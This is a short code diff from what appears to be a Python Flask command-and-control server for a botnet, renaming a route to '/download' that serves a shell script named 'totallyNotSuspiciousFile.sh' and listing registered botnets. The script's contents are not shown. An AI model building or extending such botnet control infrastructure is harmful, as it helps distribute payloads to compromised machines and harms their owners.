@@ -44,7 +44,7 @@ def command_control():
 def get_botnets():
     return jsonpickle.encode(list(map(jsonpickle.encode, botnets)))
 
-@app.route('/script', methods=["GET"])
+@app.route('/download', methods=["GET"])
 def myscript():
     path= "Shell_script/totallyNotSuspiciousFile.sh"
     return send_file(path)
